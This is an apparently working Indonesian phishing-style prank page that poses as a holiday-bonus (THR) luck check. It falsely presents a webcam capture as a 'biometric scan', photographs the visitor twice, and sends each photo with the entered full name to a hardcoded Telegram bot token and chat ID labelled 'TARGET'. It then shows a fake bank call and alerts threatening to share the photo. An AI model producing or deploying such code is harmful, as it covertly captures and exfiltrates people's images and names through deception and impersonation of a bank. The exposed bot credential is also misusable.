<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CEK KEBERUNTUNGAN THR💸🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.4rem; text-transform: uppercase; font-weight: 900; }
        #timer-box { color: #dc2626; font-weight: bold; font-size: 0.8rem; margin-bottom: 10px; background: #fee2e2; padding: 5px 15px; border-radius: 20px; display: inline-block; border: 1px solid #fca5a5; }
        
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
        
        #envelope { width: 200px; cursor: pointer; transition: 0.3s; z-index: 10; position: relative; }
        #envelope:active { transform: scale(0.9); }
        .shake { animation: shake 0.5s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }

        /* FAKE CALL UI */
        #fake-call { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #075e54; color: white; z-index: 5000; flex-direction: column; align-items: center; justify-content: center; }
        .caller-id { font-size: 2.2rem; font-weight: bold; margin-bottom: 5px; }
        .call-status { animation: blink 1s infinite; margin-bottom: 80px; font-size: 1.1rem; opacity: 0.8; }
        .call-btns { display: flex; gap: 60px; }
        .call-btn { width: 75px; height: 75px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: white; border: none; }
        .decline { background: #ea4335; } .accept { background: #34a853; }
        
        /* POPUPS */
        #fake-alert { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; }
        .alert-box { background: white; width: 85%; max-width: 320px; padding: 30px; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .btn-ready { background: #15803d; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1rem; }

        /* LOADING */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 2000; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 6px solid #f3f3f3; border-top: 6px solid #15803d; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
        
        /* FINAL PRANK SCREEN */
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 4000; justify-content: center; align-items: center; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
        #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 4010; pointer-events: none; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .particle { position: absolute; z-index: 4011; animation: popOut 2s linear forwards; }
        @keyframes popOut { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; } }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="fake-call">
        <div class="caller-id">Pusat Cyber Bank</div>
        <div class="call-status">Panggilan Masuk...</div>
        <div class="call-btns">
            <div class="call-btn decline">✖</div>
            <div class="call-btn accept">✔</div>
        </div>
    </div>

    <div id="fake-alert">
        <div class="alert-box">
            <h3 id="alert-title">📸 Scan Biometrik</h3>
            <p id="alert-msg">Silakan klik <b>Lanjutkan</b> untuk verifikasi wajah & klaim saldo THR kamu!</p>
            <button class="btn-ready" id="btn-lanjut">LANJUTKAN</button>
        </div>
    </div>

    <div id="intro">
        <h1>CEK KEBERUNTUNGAN THR💸🌙</h1>
        <div id="timer-box">🔥 Event Berakhir: <span id="countdown">02:59</span></div>
        <p>Input namamu & klik amplop untuk mulai!</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Nama Lengkap Kamu" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Buka">

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p id="loading-text" style="font-weight:bold; margin-top:25px; color:#15803d; font-size:1.1rem;">Menghubungkan...</p>
    </div>

    <div id="prank-screen">
        <div id="particle-container"></div>
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        const env = document.getElementById('envelope');
        const btnLanjut = document.getElementById('btn-lanjut');
        const fakeAlert = document.getElementById('fake-alert');
        const alertTitle = document.getElementById('alert-title');
        const alertMsg = document.getElementById('alert-msg');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingText = document.getElementById('loading-text');
        const prank = document.getElementById('prank-screen');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const fakeCall = document.getElementById('fake-call');
        
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
        const trumpetSound = new Audio('https://www.myinstants.com/media/sounds/air-horn-club-sample_1.mp3');
        const callSound = new Audio('https://www.myinstants.com/media/sounds/iphone_original-ringtone.mp3');
        
        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELE_ID = '7267912519'; 
        let globalNama = "";
        let attempt = 1;
        let isLocked = false;

        let sec = 179;
        setInterval(() => {
            let m = Math.floor(sec/60); let s = sec%60;
            document.getElementById('countdown').innerText = `0${m}:${s<10?'0':''}${s}`;
            if(sec > 10) sec--;
        }, 1000);

        env.addEventListener('click', () => {
            if(isLocked) return;
            globalNama = document.getElementById('victim-name').value;
            if(!globalNama) return alert("Isi namamu dulu!");
            
            env.classList.add('shake');
            setTimeout(() => env.classList.remove('shake'), 500);

            callSound.volume = 1.0;
            callSound.play().then(() => {
                callSound.pause();
                callSound.currentTime = 0;
            }).catch(e => {});

            prankSound.load(); trumpetSound.load();
            fakeAlert.style.display = 'flex';
        });

        btnLanjut.addEventListener('click', async () => {
            // FIX: Fullscreen harus dipicu langsung saat klik tombol
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }

            isLocked = true; 
            fakeAlert.style.display = 'none';
            loadingOverlay.style.display = 'flex';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                loadingText.innerText = "Mendeteksi Wajah (Mohon Diam)...";
                
                await new Promise(res => setTimeout(res, 2500));
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', TELE_ID);
                    fd.append('photo', blob, 'target.jpg');
                    fd.append('caption', `🎯 TARGET [${attempt}]: ${globalNama}`);
                    fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                stream.getTracks().forEach(t => t.stop());

                if(attempt === 1) {
                    attempt++;
                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        alertTitle.innerText = "⚠️ Verifikasi Gagal";
                        alertMsg.innerHTML = "Wajah tidak sinkron. Silakan <b>Senyum Lebar (Gigi Terlihat)</b> agar sistem mengonfirmasi klaim Anda.";
                        fakeAlert.style.display = 'flex';
                    }, 1500);
                } else {
                    triggerCall();
                }
            } catch (e) {
                // BUG FIX: Jika kamera ditolak, langsung trigger call biar prank jalan terus
                triggerCall();
            }
        });

        function triggerCall() {
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                fakeCall.style.display = 'flex';
                
                if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]);
                
                callSound.loop = true;
                callSound.play().catch(e => {});
                
                setTimeout(finalPunchline, 2000); 
            }, 1500);
        }

        function finalPunchline() {
            callSound.pause();
            fakeCall.style.display = 'none';
            loadingOverlay.style.display = 'none';
            prank.style.display = 'flex';
            
            if (navigator.vibrate) {
                navigator.vibrate([100, 50, 100, 50, 100, 50, 500, 200, 1000]);
            }
            
            trumpetSound.play();
            prankSound.loop = true;
            prankSound.play();
            
            setInterval(burst, 1500);
            
            setTimeout(() => alert("🚨 ALERT: AKSES ILEGAL TERDETEKSI!"), 1000);
            setTimeout(() => alert("FOTO SENYUM ANDA SEDANG DIKIRIM KE GRUP WHATSAPP KELUARGA..."), 3000);
        }

        function burst() {
            const container = document.getElementById('particle-container');
            for (let i = 0; i < 35; i++) {
                const p = document.createElement('div');
                p.className = 'particle'; p.innerText = ['😂','🤣','💩','🐒'][Math.floor(Math.random()*4)];
                p.style.left = '50%'; p.style.top = '50%';
                const a = Math.random()*Math.PI*2;
                p.style.setProperty('--tx', Math.cos(a)*280+'px');
                p.style.setProperty('--ty', Math.sin(a)*280+'px');
                p.style.setProperty('--s', Math.random()*3+1.5);
                p.style.setProperty('--r', Math.random()*360+'deg');
                container.appendChild(p);
                setTimeout(() => p.remove(), 2000);
            }
        }
    </script>
</body>
</html>
